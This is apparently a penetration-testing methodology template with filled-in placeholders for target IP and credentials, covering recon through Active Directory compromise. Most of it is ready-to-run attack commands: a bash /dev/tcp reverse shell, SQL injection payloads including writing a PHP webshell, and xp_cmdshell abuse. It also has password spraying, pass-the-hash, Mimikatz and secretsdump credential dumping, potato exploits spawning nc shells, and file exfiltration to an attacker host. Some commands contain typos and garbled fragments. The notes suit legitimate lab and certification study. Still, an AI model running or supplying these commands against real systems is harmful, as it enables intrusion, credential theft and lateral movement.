---
IP: 1.1.1.1
Port: "443"
Username: Jimmy
Password: Password1
---

# Reconnaissance

### Autorecon
```
sudo $(which autorecon) <%tp.frontmatter.IP%>
```
# Scanning
## Network Scanning
### Nmap
-A Aggressive
-sU UDP
-sS Stealth scan
- Vulnerability scan
```
sudo nmap --script "vuln" -sV -p <%tp.frontmatter.Port%> <%tp.frontmatter.IP%>
```
### Living Off Land
```
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<%tp.frontmatter.Type%>", $_)) "TCP port $_ is open"} 2>$null
```

## HTTP
### [[Web App|Webapp]]

### IP Address to Hostname

- Reverse DNS lookup
```
dig -x <%tp.frontmatter.IP%>
```

```
nslookup <%tp.frontmatter.IP%>
```


#### Identifying Website Technologies
builtwith.com will take a domain and will look at the various tech types, widgets and more importantly framework used. 
#Wappalyzer extension for firefox which also gives a good indication of the technology used. This is slightly more active. 
#whatweb is a tool that comes with kali that will also do the same. 
### GoBuster
```
sudo gobuster dir -u http://<%tp.frontmatter.IP%> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
-b Negative status codes
- HTTPS -k flag to disable cert
#### API Enum
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```
### FFUF
- Directory
```
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://<%tp.frontmatter.IP%>/FUZZ
```
- extensions -e 
- Recursive scanning
```
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://<%tp.frontmatter.IP%>/FUZZ -recursion -recursion-depth 2
```
- Subdomains
```
ffuf -c -w /path/to/wordlist -u https://<%tp.frontmatter.IP%> -H "Host: FUZZ.ffuf.io.fi"
```
- Matching status codes
```
ffuf -c -w /path/to/wordlist -u https://<%tp.frontmatter.IP%> -mc 200,301
```

### API
- Curl with the following
```
curl -d "" -X POST "http://<%tp.frontmatter.IP%>:<%tp.frontmatter.Port%>/list-running-procs"
```

### SQL Injection
##### Basic Commands - mysql 
```
mysql -u root -p'root' -h <%tp.frontmatter.Type%> -P <%tp.frontmatter.Port%>
```
- Select version
```
select version();
```
- Shjow username
```
select system_user();
```
- Show databases
```
show databases;
```
- Select database
```
USE database_name;
```
- Show tables
```
SHOW TABLES;
```
- Select info from database
```
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec'; (in this instance mysql was the name of the database)
```

##### Basic Commands- MSSql
- We can sometimes access MSSQL through #impacket
- impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
`SELECT @@version;`
`SELECT name FROM sys.databases;` (lists all databases)
`SELECT * FROM offsec.information_schema.tables;` (Once we have found the database we wish to access we can now view the tables. (In this case the database is named offsec))
`select * from offsec.dbo.users;` (The table users seemed most interested. This command dumps all from users)

##### Error Based Payloads
- Start by checking for SQL. To do this throw in values such as '  in order to try and prompt an error message
- If this is the case for a login page a query will generally be something like
```
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$<%tp.frontmatter.Password%>'";
```
- We can try to bypass this authentication by appending ' OR 1=1 -- // to the end of the username
- We could instead add SQL queries after the username and try to enumerate the database ourselves. '  or 1=1 in (show databases) -- // for example 
- We could use this to enumerated databases and tables in order to receive user password hashes for example
- ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
##### Union Based Payloads
- Union payload can be used in apps where an input returns more than one result (3.g a search returns name,address,etc.)
- Once happy this is the case we first need to understand how many columns are present in the target table.
- ' ORDER BY 1-- // (increase this until we receive an error)
- With this number we can begin to understand the database (in this example 5)
- %' UNION SELECT database(), user(), @@version, null,null -- //
- We can now look to bring back the table names 
- ' UNION SELECT table_name, column_name, table_schema, null, null FROM information_schema.columns where table_schema=database() -- //
- We can then look to extract information from these tables
- ' UNION SELECT username, password, description, null, null FROM users -- //
##### Blind SQL Injection
- We can use response time to infer whether a statement is true or not
`http://<%tp.frontmatter.Type%>/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //`
- In this case if the username proves valid the response will sleep for 3 seconds

##### SQLI Code Execution
- IN MSSQL it may be possible to take a string and pass it to the cmd shell for execution if we have the correct permissions
- If we are into the database through something such as impacket we can attempt to enable advanced options with
```
EXECUTE sp_configure 'show advanced options', 1;
**WAIT FOR RESPONSE
RECONFIGURE;
```
Now we need to enable the xp_cmdshell with
```
EXECUTE sp_configure 'xp_cmdshell', 1;
*** WAIT FOR RESPONSE
RECONFIGURE;
```
Now we can run commands with 
```
EXECUTE xp_cmdshell 'whoami';
```
- From here we could  upgrade to a reverse shell
- Alternatively if we are unable to use xp_cmdshell we may still use SELECT INTO_OUTFILE to write files to the webserver
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
- If we are now able to access this page we have a simple webshell

### File Upload
#### Webshell
```
$ <?php echo shell_exec( > $_GET['cmd']);?>
```

### Vulnerable CMS
#### Wordpress
```

```
## SMB
### SMBClient
```
smbclient -L \\\\<%tp.frontmatter.IP%>\\
```

### Enum4Linux
```
enum4linux -a <%tp.frontmatter.IP%> 
```

## DNS
### DNSRecon
```
dnsrecon -r 127.0.0.1/24 -n <%tp.frontmatter.IP%> -d blah
```

## RPC
### RPCDump
```
rpcdump.py <%tp.frontmatter.IP%> -p <%tp.frontmatter.Port%>
```
### RPC Client
```
rpcclient -U '' <%tp.frontmatter.IP%>
```
## SMTP
- Enumerate with the following for username enumeration/confirmation (in thiss example root)
```
kali@kali:~$ nc -nv <%tp.frontmatter.IP%> <%tp.frontmatter.Port%>
(UNKNOWN) [192.168.50.8] 25 (smtp) open
220 mail ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
^C
```

## SNMP (Scan UDP IN NMAP)

### SNMPBulkWalk - Had more results
```
snmpbulkwalk -c public -v2c <%tp.frontmatter.IP%> .
```
### SNMPWalk
```
snmpwalk -c public -v1 -t 10 <%tp.frontmatter.IP%>
```
### NMAP
```
nmap -p 161 -sU -sC <%tp.frontmatter.IP%>
```

# Exploits

# Initial Access
## Password Attacks
### Hashcat

- Basic syntax
```
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```
- Rules
```
kali@kali:~/passwordattacks$ cat demo1.rule     
$1 c $!

kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!
```

### Hydra
#### HTTP POST
```
sudo hydra -l <%tp.frontmatter.Username%> -P /usr/share/wordlists/rockyou.txt <%tp.frontmatter.IP%> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
#### HTTP Basic Auth
```
hydra -l <%tp.frontmatter.Username%> -P /usr/share/wordlists/rockyou.txt <%tp.frontmatter.IP%> http-get
```
#### RDP
```
sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://<%tp.frontmatter.Type%>
```
- Base 64 passwords or usernames with
```
^USER64^
```
### John
#### SSH 
- Convert ssh key
```
ssh2john id_rsa > ssh.hash
```
- Crack
```
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash
```
- John rules
```
cat ssh.rule

[List.Rules:sshRules]
$1 $3 $7 $1

sudo sh -c 'cat /home/kali/passwordattack/ssh.rule >> /etc/john/john.conf'
```

#### PDF
```
pdf2john test.pdf
```
- Crack with 
```
john --wordlist=/usr/share/wordlists/rockyou.txt infra.hash
```
### Crackmapexec
```
crackmapexec smb <%tp.frontmatter.IP%> -u '<%tp.frontmatter.Username%>' -p '<%tp.frontmatter.Password%>' -d corp.com --continue-on-success
```
- PTH
```
crackmapexec smb 172.16.157.0/24 -u <%tp.frontmatter.Username%> -H 'NTHASH'
```
- Password Spraying


### Kerbrute
```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "<%tp.frontmatter.Password%>"
```

## SMB
### SMBMAP
```
smb-map --host-file 
```

### SMB Client
```
smbclient  \\\\<%tp.frontmatter.IP%>\\SYSVOL -U username%password
```

- PTH
```
smbclient \\\\<%tp.frontmatter.IP%>\\sysvol -U <%tp.frontmatter.Username%> --pw-nt-hash e728ecbadfb02f51ce8eed753f3ff3fd
```

## RDP

### Local Access
```
rdesktop -u <%tp.frontmatter.Username%> -p <%tp.frontmatter.Password%>  <%tp.frontmatter.IP%>
```

### Domain Access
```
xfreerdp /u:<%tp.frontmatter.Username%> /p:'<%tp.frontmatter.Password%>' /d:relia.com  /v:<%tp.frontmatter.IP%> 
```
## WinRM
### EvilWinWM
```
evil-winrm -u <%tp.frontmatter.Username%> -p <%tp.frontmatter.Password%> -i <%tp.frontmatter.IP%>
```
- Pass the hash
```
evil-winrm -u <%tp.frontmatter.Username%> -H <Hash> -i <%tp.frontmatter.IP%>
```

## MSSQL
### MSSQL.PY
```
mssqlclient.py -windows-auth oscp.exam/<%tp.frontmatter.Username%>:<%tp.frontmatter.Password%>@<%tp.frontmatter.IP%>
```

- Try xm_cmdshell as in the webapp section


## Reverse Shells

### Bash
```
bash -i >& /dev/tcp/<%tp.frontmatter.IP%>/<%tp.frontmatter.Port%> 0>&1
```

### Python Spawn Shell
```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

# Linux Enumeration Methodology

### System Enum
##### Look for low hanging fruit first. 
- uname -a
- cat /proc/version
- lscpu
- ps aux
- ps aux | root (isolates the processes to a user)
- cat /etc/issue
- os-release
### User Enum
- whoami
- id
- sudo -l
- cat /etc/passwd + ls - la /etc (look for overly permissive either w /etc/passwd or r /etc/shadow)
- cat /etc/group
- show groups
- history
- env

### Network Enumeration
- ip a / ifconfig
- ip route
- netstat -ano
- ss (Similar to netstat)
- route / routel (shows routing table)
- cat /etc/iptables (This may list firewall rules)

### Hunting Files
-  Look for passwords
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null   
```
-  Look for files. In this case SSH keys
```
find / -name id_rsa 2> /dev/null 
```
 - SSH key types
 
```
DSA	~/.ssh/id_dsa.pub	~/.ssh/id_dsa
RSA	~/.ssh/id_rsa.pub	~/.ssh/id_rsa
ECDSA	~/.ssh/id_ecdsa.pub	~/.ssh/id_ecdsa
Ed25519 (Edwards-curve DSA)	~/.ssh/id_ed25519.pub	~/.ssh/id_ed25519
```

- Grep for specific word
```
grep -R "password"
```

- Grep for specific word and print the filename it is in
```
grep -R "database" | awk -F: '{print $1}' | uniq
```
### Installed Apps
- Installed applications in Debian systems use dpkg. Red hat use rpm
```
dpkg -l
```

### Find Directories Writable By Current User
```
find / -writable -type d 2>/dev/null
```

### Unmounted Drives
```
mount
```
- List all available disks
```
ls /etc/fstab
```
- Lists all drives mounted on boot
```
lsblk
```
- List all available disks
### Kernel Modules
```
lsmod
```
- Once we find something we want to dig into further we can use modinfo to do this. In this example we use libdata
```
/sbin/modinfo libdata
```

### PSPY
- pspy is a downloadable tool that may reveal what is going on with the machine, possible cron jobs etc. it may also leak creds. 

## Escalation Paths

#### Unix Privesc check
```
unix-privesc-check standard > output.txt
```

#### Compiling Exploits
```
gcc -pthread c0w.c -o cow
```

##### Starting XenSpawn
```
 sudo systemd-nspawn -M spawn
```
- Close with command exit

#### Passwd File
- Generate password to enter into passwd file
```
openssl passwd <password>
```
- Unshadow for cracking
```
unshadow passwd shadow
```
- Cracking hash
```
hashcat -m 1800 shadow.txt rockyou.txt 
```

#### Sudo
```
sudo -l 
```
-  https://gtfobins.github.io
##### CVE-2019-14287
- If sudo -l returns  (ALL, !root) /bin/bash it is vulnerable to this CVE
- Exploit with
```
sudo -u#-1 /bin/bash
```
- Can also change the 1 if we wish to move to another user that isn't root

##### CVE 2019-18634
- Check the result of sudo -v against the [following](https://github.com/saleemrashid/sudo-cve-2019-18634)
- If so and we receive visual feedback of the passwd when we run su
- Compile the above exploit with
```
gcc -o exploit exploit.c
```

#### SUID
 - Compare below with GTFO Bins
 ```
 find / -perm -u=s -type f 2>/dev/null
```

#### Capabilities
```
getcap -r / 2>/dev/null
```
- Look for a response with ep in the end against a service that we believe exploitable (something like Python / Ruby)
- Python to elevate privs
```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### CronJobs

```
crontab -l
```

```
cat /etc/crontab
```

```
ls -lah /etc/cron*
```

```
grep "CRON" /var/log/syslog
```
- Use the following bash in a cronjob if possible to escalate privs
```
echo 'cp /bin/cd bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```
##### Exploiting TAR / Backup based Cron jobs
- In this case runme.sh contains malicious bash. We use the checkpoint to stop and execute this script
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\runme.sh
```
#### NFS Root Squashing
```
cat /etc/exports
```
- If a file shows no_root_squash it means it can be mounted with
  ```
  showmount -e victimip
``
- Now roun the following to mount the file and put something malicious in the directory
```
mkdir mountme
mount -o rw,vers=2 victimip:/tmp /tmp/mountme
```
- If the previous errors out try the following
```
mount -vvvv -t nfs -o vers=3 ictimip:/tmp /tmp/mountme
```
- Add malicious c to this directory
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c
```
- Compile with the following on attacker machine
```
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s
```
- Run on victim machine


# Windows Enumeration

### Situational Awareness
- To make a decision on where our exploit path is we need to enumerate the following
```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```


### System Enum
systeminfo  - In depth informastion about the victim machine
- This takes the above and pulls out relevant info
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
- wmic qfe - Information on patch levels
### User Enum
whoami - tells us the usernameami /priv Will tell us what priveledges are available to the user. 
whoami /groups Gives us the groups we are part of and what rights we have. 

net user Tells us the users on this machine
net user username gives extra info about the supplied username. 
net localgroup administrators Will list all members of the specified group. 
Get-LocalUser - Similar to net user gives a list of all local users
Get-LocalGroup - Similar to net local group
Get-LocalGroupMember Administrators - Lists all members of the group

#### Groups
- Interesting groups to us are obviously Admin groups. It's also useful to know who is in Remote management users (Use evil-winrm) and Remote Desktop users
#### Network Enum
ipconfig /all - extra info such as default gateway, domain controller, DNS etc. 
arp -a  - arp table
route print - Shows active routes/routing table, useful to determine possible attack vectors to other networks
netstat -ano Shows what ports are open, what ports are the machine listening on

#### Installed Apps
- 64 and 32 bit installed apps
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
```
```
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
#### Running Apps

```
Get-Process
```

- Running services
```
Get-Service
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
- Get rid of the last part to remove running services filter
- Running and stopped service
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
### Check Permissions
#### Binaries
```
icacls "C:\xampp\apache\bin\httpd.exe"
```
#### Services
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

#### Scheduled Tasks
```
Get-ScheduledTask
schtasks /query /fo LIST -v
```
#### Password Hunting
```
findstr /si password *.txt
```
#### File Search
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
#### History
```
Get-History
```
```
(Get-PSReadlineOption).HistorySavePath
```
#### Env Variables
```
dir env:
```

### Escalation Paths

#### Kernel Exploits
- Run windowsexploitsuggester.py to ascertain if there may be any kernel exploits
- Google any results
- May find compiled binaries [here](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)

#### Token Impersonation
- Two types - delegation and impersonation
- If we see SEImpersonate as a result of whoami /priv we may be able to run an impersonate priv
- See more on this [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges)
##### Potato Attacks
- Abuses SEImpersonate also
###### Rogue Potato
- To do this we need to authenticate to our local machine and then proxy the traffic back to the victim using Socat using the following on the attacker machine
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:<%tp.frontmatter.IP%>:9999
```
- Now execute the Roguepotato binary with the following making sure the listening port matches the forwarded port of the socat relay (in this case 9999). In this example shell.exe is a rev shell which we can catch with the elevated privs
```
potato.exe -r <Attacker_IP> -e "shell.exe" -l 9999
```

##### PrintSpoofer
- Also abuses SEImpersonate
```
printspoofer.exe -c "c:\users\shell.exe" -i
```
#### Dumping SAM Hashes
- If we have the permissions dump sam and system with the following
```
reg save hklm\sam sam
reg system hmlm\system system
```
- Convert to NTLM with 
```
samdump2 system sam
```
- Sometimes this doesn't work so try Mimikatz
```
lsadump::sam /system:SYSTEM /sam:SAM
```

#### NTDS.dit
- If yu gain access to ntds.dit, system and security you can dump with secretsdump using
```
secretsdump.py -ntds ntds.dit -system system -security security local
```
#### RunAs
- If we have gained a set of creds we can attempt to use these with runas
```
runas /user:backupadmin cmd
```
- We may also pick up stored creds abusing this by running the following
```
cmdkey /list
```

#### Vulnerable Service 
- List all installed services that are running
```
Get-Service
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
- Running and stopped services
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
- May not work with Winrm
- Check permissions on binaries
```
icacls "C:\xampp\apache\bin\httpd.exe"
```
- Permissions of interest
Mask 	Permissions
F 	Full access
M 	Modify access
RX 	Read and execute access
R 	Read-only access
W 	Write-only access 
- Start and stop services
```
net stop mysql
```
- Check if the service has Auto as start mode
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```
- If so shutdown with
```
shutdown /r /t 0
```
##### Scheduled Tasks
- View scheduled tasks with
```
Get-ScheduledTask
schtasks /query /fo LIST -v
```

# Active Directory
## Initial Access
### SMBRelay
```
ntlmrelayx.py -tf targets.txt -smb2support
```

## Enumeration
- All users in domain
```
net user /domain
```
- Groups in domain
```
net group /domain
```

### PowerUP
- Run all checks
```
Invoke-AllChecks
```

### PowerView
#### Commands
Get-NetDomain - Gives us basic information about the domain including name etc
Get-NetDomainController - This highlights the IP address etc of the domain controller
Get-NetDomainPolicy - This shows us all domain policies. Once we wish to enumerate one of the policies we can use 
(Get-DomainPolicy)."policy_name" thisd can highlight things such as password policy etc.
Get-NetUser - This will pull info about all users. Including description where some people store passwords.
Get-UserProperty will list properties we can request information on
Get-UserProperty - Property propertyname 
Here we can look at password last set for old passwords or even last login - This may ID honeypot accounts. 
Get-NetComputer will list out all computers in the domain. 
Get-Netcomputer -FullData | select operating system  (think of select as like grep)
Get-NetGroup -GroupName "Domain Admin" - highlights domain admins
Invoke-ShareFinder - Highlights all SMB shares on the network. 
Get-NetGPO returns group policy objects
Get-ModifiableServiceFile - Looks for service files we can modify
Get-UnquotedService - Looks for unquoted service paths
Find-LocalAdminAccess - Find machines where current user has local admin access
Get-NetSession -Computername Files04 - Sessions on machine
Get-NetUser -SPN | select samaccountname,serviceprincipalname - Enumerate SPNs
Get-ObjectAcl -Identity stephanie - Shows who has permissions on the stated identity/object
Find-LocalAdminAccess - Look for admin access for the user across domain
Find-DomainShare - Enumerate domain shares
- Look for genericall access on stated object
```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
Find-DomainShare - Find domain shares
Find-DomainShare -CheckShareAccess - To show shares we can view

### Bloodhound
```
neo4j console
bloodhound
```
- Grab data from victim machine with sharphound using
```
Import-Module .sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```
- Alternatively use .exe
```
Sharphound.exe
Sharphound.exe --CollectionMethods All --domain <Domain> --ExcludeDCs
```

## Post Compromise Exploit
#### CrackMapExec
```
crackmapexec smb <%tp.frontmatter.IP%> -u users.txt -p <%tp.frontmatter.Password%> -d corp.com --continue-on-success
```
- Pass The Hash
```
sudo crackmapexec smb <%tp.frontmatter.IP%>/24 -u "<%tp.frontmatter.IP%>" -H 64f12cddaa88057e06a81b54e73b949b --local-auth
```

#### PSExec
```
psexec.py -hashes :2892d26cdf84d7a70e2eb3b9f05c425e <%tp.frontmatter.Username%>@<%tp.frontmatter.IP%>
```
#### Kerbrute
```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "<%tp.frontmatter.Password%>"
```

#### SMBClient
```
smbclient \\\\<%tp.frontmatter.IP%>\\secrets -U <%tp.frontmatter.Username%> --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```


### Dump Hashes
#### SecretsDump
```
secretsdump.py <domain>/<%tp.frontmatter.Username%>:<%tp.frontmatter.Password%>@<%tp.frontmatter.IP%>
```

### AS Rep Roasting
- Enumerate with the following on victim
```
Get-DomainUser -PreauthNotRequired 
```
- Get hashes with
```
impacket-GetNPUsers -dc-ip <%tp.frontmatter.IP%>  -request -outputfile hashes.asreproast <Domain>/<%tp.frontmatter.Username%>
```
- Or run the following on victim machine
```
cd C:\Tools
.\Rubeus.exe asreproast /nowrap
```
### Get User SPNs
```
GetUserSPNs.py <Domain>/<%tp.frontmatter.Username%>:<%tp.frontmatter.Password%> -dc-ip <%tp.frontmatter.IP%> -request
```
- Or on victim machine with
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
- Crack with -m 13100
# Port Forwarding

### Socat
- On victim machine run
```
./socat tcp-l:33060,fork,reuseaddr tcp:<Remote IP>:3306 &
```
- Traffic directed at 33060 will be forwarded to 172.16.0.10:3306
### NetSH
- On victim machine run
```
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<Local> connectport=22 connectaddress=<Remote>
```
- If necessary open firewall port with
```
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=<Local> localport=2222 action=allow
```


./socat tcp-l:8001,fork,reuseaddr tcp:127.0.0.1:631 &
# Tunneling
### Reverse

#### SSH 
- Start SSH on attacker machine with
```
sudo systemctl start ssh
```

- On victim machine run
```
ssh -R 8000:<Remote>:80 kali@<Local> -i keyfile -fN
```
- Anything directed at local host 8000 on attacker machine will hit 10.10.10.10:80
##### Reverse SOCKS
- On victim machine run
```
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
```
- Now use proxychains / foxy proxy to proxy traffic through the victim
#### Chisel
- Victim machine
```
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
```
- Direct traffic at the local port
- Attacker machine
```
./chisel server -p LISTEN_PORT --reverse &
```

##### Reverse SOCKS Proxy
On Attacker Box run
```
./chisel server -p LISTEN_PORT --reverse &
```
On Compromised box run
```
./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```
### Forward
#### SSH
- Attacker machine run
```
ssh -L 8000:Remote:80 user@Victim -fN
```
##### Forward SOCKS
- Attacker machine
```
ssh -D 8000 user@Victim
```
#### PLINK
- On attacker machine run
```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```
- Convert ssh keys to putty format using
```
puttygen KEYFILE -o OUTPUT_KEY.ppk
```
#### Chisel
- Compromised machine
```
./chisel server -p LISTEN_PORT
```
- Attacker
```
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```
- Compromised machine
```
./chisel server -p LISTEN_PORT --socks5
```
- Attacker machine
```
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
```

#### Ligolo-Ng
- Set up the interfaces on the attacker machine with the following
```
ip tuntap add user kali mode tun ligolo
ip link set ligolo up
```
- On attacker machine start the ligolo script
```
./proxy -selfcert
```
- On victim machine run 
```
.\agent.exe -connect 192.168.45.241:11601 -ignore-cert
```
- Then add the route to your attacker machine with
```
sudo ip route add 172.16.83.0/24 dev ligolo
```
- Ensure to start the session in the ligolo script
- Add listeners with the following (in this instance direct traffic towards 80 and host services on 1337)
```
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:1337 --tcp
```

# Lateral Movement

# File Transfers
## Attacker Machine to Victim
#### HTTP Server

- Attacker Run
```
python3 -m http.server 8000
```
- Victim run
```
certutil.exe -urlcache -f http://<%tp.frontmatter.IP%>:<%tp.frontmatter.Port%>/file.txt file.txt
```
```
iwr -Uri http://10.10.10.10.:8000/file.txt -Outfile file.txt
```
```
wget http://10.10.10.10:8000/file.txct
```

#### FTP
- Attacker Run
```
python -m pyftpdlib -p 21
```
- Victim run
```
ftp <attacker ip>
anonymous
get file.txt
```

```
http://www.pentestpundit.com/2020/05/create-pure-ftpd-server-to-transfer-payloads-kali.html
```
#### SMB Server
- Attacker Run
```
smbserver.py share share/ -smb2support
```
- Victim Run
```
copy \\10.10.14.7\share\nc.exe c:\windows\temp 
```


- We can also set up the drive in a way that our victim has more persistent access to save constant uploading from webserver

```
smbserver.py <SMBDRIVENAME> $pwd -smb2support -user techflow -password <password>
```

- On victim run
```
$pass = convertto-securestring '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('techflow',$pass)
New-PSDrive -Name techflow -PSProvider FileSystem -Credential $cred -Root <LOCAL>\<SMBDRIVENAME>
```
-Now we can access with
```
cd <Username>:
```
- We can now run executables directly from here
## Victim To Attacker
#### HTTP
- Reverse of above

#### FTP
- Attacker run
```
python -m ftpdlib -p 21 -w
```
- Victim Run
```
ftp <attacker ip> 
get file.txt
```
- If the shell is not interactive try using the following in powershell
```
$File = "D:\Dev\somefilename.zip"
$ftp = "ftp://username:password@example.com/pub/incoming/somefilename.zip"

"ftp url: $ftp"

$webclient = New-Object System.Net.WebClient
$uri = New-Object System.Uri($ftp)

"Uploading $File..."

$webclient.UploadFile($uri, $File)
```

#### NC
- On victim machine run the follwing in cmd prompt not powershell
```
.#nc.exe <Local> <Port> < c:\file.exe
```
- Attacker machine
```
nc -lvnp <Port> > file.exe
```
# Priv Esc Windows
## Dumping Creds
### SAM Hashes
```
reg save hklm\sam sam
reg system hmlm\system system
```
- Transfer these both to attacker machine
- On attacker machine run
```
samdump2 system sam
```
- Can also dump on Mimikatz with
```
lsadump::sam /system:SYSTEM /sam:SAM
```

### SecretsDump
```
secretsdump.py <Domain>/<%tp.frontmatter.Username%>:<%tp.frontmatter.Password%>@<%tp.frontmatter.IP%>
```
## Potato Attacks
- Abuses SEImpersonate
- ### Rogue Potato
- Attacker machine
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:<%tp.frontmatter.IP%>:9999
```
- Victim machine (rev shell)
```
potato.exe -r <Local IP> -e "nc.exe <Listener IP> <Listener Port> -e cmd.exe" -l 9999
```

### God Potato
- This one was picky with commands. Downloaded the nc binary and got it to run with this
```
.\godpotato.exe -cmd "c:\users\adrian\nc.exe <Listener IP> <Listener Port> -e c:\Windows\System32\cmd.exe"
```

### PrintSpoofer
```
printspoofer.exe -c "c:\users\shell.exe" -i
.\printspoofer.exe -i -c powershell.exe
```

### RunAS
- Check what privs we have stored on machine with
```
cmdkey /list
```
- We can run commands as this user with
```
runas /user:backupadmin cmd
```

## Mimikatz
### Logonpasswords
```
sekurlsa::logonpasswords
```
### SamHashes
```
lsadump::sam
```

# Priv Esc Linux

# Active Directory Enumeration

## Kerberos
#### Kerbrute
- Username Enum
```
./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
```
- Password Spray
```
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
```
#### Impacket
- Get user SPNs
```
GetUserSPNs.py -dc-ip <%tp.frontmatter.IP%> sittingduck.info/notanadmin
```
- Check if any objects are vulnerable to ASReproasting with
```
Get-DomainUser -PreauthNotRequired 
```
- ASREPRoasting from attacker machine
```
impacket-GetNPUsers -dc-ip <%tp.frontmatteP%>  -request -outputfile hashes.asreproast <Domain>/<%tp.frontmatter.Username%>
```
- From victim machine
```
.\Rubeus.exe asreproast /nowrap
```






